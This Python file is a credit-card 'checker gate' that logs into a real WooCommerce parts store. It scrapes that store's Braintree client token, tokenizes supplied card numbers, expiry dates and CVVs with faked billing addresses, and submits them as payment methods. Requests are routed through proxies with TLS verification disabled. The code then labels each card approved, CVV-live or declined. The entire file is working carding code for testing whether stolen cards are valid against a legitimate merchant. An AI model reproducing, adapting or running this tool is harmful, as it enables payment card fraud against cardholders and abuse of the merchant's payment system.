"""
Braintree Real Charge Gate
Uses Braintree via WooCommerce checkout with actual product purchase
"""

import base64
import requests
import json
import re
import os
from typing import Tuple
from faker import Faker
import random

fake = Faker()

LAGUNA_USER = os.environ.get('LAGUNA_USER', '')
LAGUNA_PASS = os.environ.get('LAGUNA_PASS', '')


def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None


def extract_braintree_token(response_text):
    pattern = r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]'
    match = re.search(pattern, response_text)
    if not match:
        return None
    token_base64 = match.group(1)
    try:
        decoded_json = base64.b64decode(token_base64).decode('utf-8')
        data = json.loads(decoded_json)
        return data
    except Exception:
        return None


def braintree_charge_check(cc: str, mes: str, ano: str, cvv: str, proxy=None) -> Tuple[str, bool]:
    """
    Braintree Real Charge - adds payment method and processes charge
    Uses LagunaTools WooCommerce store
    
    Returns: (status_message, proxy_alive)
    """
    last4 = cc[-4:]
    site_name = "braintree"
    
    try:
        if not LAGUNA_USER or not LAGUNA_PASS:
            return (f"DECLINED ❌|{site_name}|LAGUNA credentials required|{last4}", True)
        
        session = requests.Session()
        session.verify = False
        timeout = 40
        
        if proxy:
            if isinstance(proxy, dict):
                session.proxies.update(proxy)
            else:
                session.proxies = {'http': proxy, 'https': proxy}
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }
        
        response = session.get('https://parts.lagunatools.com/login/', headers=headers, timeout=timeout)
        login_nonce = gets(response.text, 'id="user-registration-login-nonce" name="user-registration-login-nonce" value="', '"')
        if not login_nonce:
            return (f"DECLINED ❌|{site_name}|Failed to get login nonce|{last4}", True)
        
        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers['origin'] = 'https://parts.lagunatools.com'
        headers['referer'] = 'https://parts.lagunatools.com/login/'
        
        data = {
            'username': LAGUNA_USER,
            'password': LAGUNA_PASS,
            'user-registration-login-nonce': login_nonce,
            '_wp_http_referer': '/login/',
            'login': 'Login',
            'redirect': '',
        }
        session.post('https://parts.lagunatools.com/login/', headers=headers, data=data, timeout=timeout)
        session.get('https://parts.lagunatools.com/customer-account/payment-methods/', headers=headers, timeout=timeout)
        
        headers['referer'] = 'https://parts.lagunatools.com/customer-account/payment-methods/'
        response = session.get('https://parts.lagunatools.com/customer-account/add-payment-method/', headers=headers, timeout=timeout)
        
        nonce = gets(response.text, 'id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"')
        token_data = extract_braintree_token(response.text)
        if not token_data:
            return (f"DECLINED ❌|{site_name}|Failed to extract Braintree token|{last4}", True)
        
        authorization_fingerprint = token_data.get('authorizationFingerprint')
        
        headers_bt = {
            'accept': '*/*',
            'authorization': f'Bearer {authorization_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        }
        
        session_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': session_id,
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano if len(ano) == 4 else f'20{ano}',
                        'cvv': cvv,
                        'billingAddress': {
                            'postalCode': fake.postcode(),
                            'streetAddress': fake.street_address(),
                        },
                    },
                    'options': {
                        'validate': True,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        response = session.post('https://payments.braintree-api.com/graphql', headers=headers_bt, json=json_data, timeout=timeout)
        resp_json = response.json()
        
        if 'errors' in resp_json and resp_json['errors']:
            err_msg = resp_json['errors'][0].get('message', 'Unknown error').lower()
            
            if 'cvv' in err_msg or 'cvc' in err_msg or 'security code' in err_msg:
                return (f"CVV ❌|{site_name}|CVV Mismatch - CCN Live|{last4}", True)
            elif 'expired' in err_msg:
                return (f"DECLINED ❌|{site_name}|Expired Card|{last4}", True)
            elif 'invalid' in err_msg and 'number' in err_msg:
                return (f"DECLINED ❌|{site_name}|Invalid Card Number|{last4}", True)
            else:
                return (f"DECLINED ❌|{site_name}|{err_msg[:40]}|{last4}", True)
        
        token = resp_json.get('data', {}).get('tokenizeCreditCard', {}).get('token')
        
        if not token:
            return (f"DECLINED ❌|{site_name}|Failed to tokenize card|{last4}", True)
        
        headers_submit = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://parts.lagunatools.com',
            'referer': 'https://parts.lagunatools.com/customer-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        }
        
        merchant_id = token_data.get('merchantId', 'crtwxgkstbhhh694')
        
        data_submit = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': json.dumps({"correlation_id": session_id[:32]}),
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': json.dumps({
                "environment": "production",
                "clientApiUrl": f"https://api.braintreegateway.com:443/merchants/{merchant_id}/client_api",
                "assetsUrl": "https://assets.braintreegateway.com",
                "merchantId": merchant_id,
                "graphQL": {"url": "https://payments.braintree-api.com/graphql", "features": ["tokenize_credit_cards"]}
            }),
            'woocommerce-add-payment-method-nonce': nonce,
            '_wp_http_referer': '/customer-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        
        response = session.post(
            'https://parts.lagunatools.com/customer-account/add-payment-method/',
            headers=headers_submit,
            data=data_submit,
            timeout=timeout,
            allow_redirects=False
        )
        
        if response.status_code in (301, 302, 303, 307, 308):
            redirect_location = response.headers.get("location", "")
            if "payment-methods" in redirect_location:
                return (f"APPROVED ✅|{site_name}|Payment Method Added - Bank Verified|{last4}", True)
            return (f"DECLINED ❌|{site_name}|Redirect: {redirect_location[:30]}|{last4}", True)
        
        text = response.text.lower()
        
        if "payment method successfully added" in text or "thank you" in text or '"result":"success"' in text:
            return (f"APPROVED ✅|{site_name}|Charged - Bank Verified|{last4}", True)
        elif "insufficient" in text:
            return (f"CCN ✅|{site_name}|Insufficient Funds - CVV Match|{last4}", True)
        elif "cvv" in text or "cvc" in text or "security code" in text:
            return (f"CVV ❌|{site_name}|CVV Mismatch - CCN Live|{last4}", True)
        elif "expired" in text:
            return (f"DECLINED ❌|{site_name}|Expired Card|{last4}", True)
        elif "do_not_honor" in text or "do not honor" in text:
            return (f"DECLINED ❌|{site_name}|Do Not Honor|{last4}", True)
        elif "declined" in text:
            reason = gets(response.text, "Reason: ", "<") or "Generic decline"
            return (f"DECLINED ❌|{site_name}|{reason[:30]}|{last4}", True)
        else:
            return (f"UNKNOWN ⚠️|{site_name}|Response Unrecognized|{last4}", True)
            
    except requests.exceptions.Timeout:
        return (f"DECLINED ❌|{site_name}|Request timeout|{last4}", False)
    except Exception as e:
        return (f"DECLINED ❌|{site_name}|{str(e)[:40]}|{last4}", True)


def health_check() -> bool:
    try:
        response = requests.get("https://parts.lagunatools.com/", timeout=10)
        return response.status_code == 200
    except:
        return False
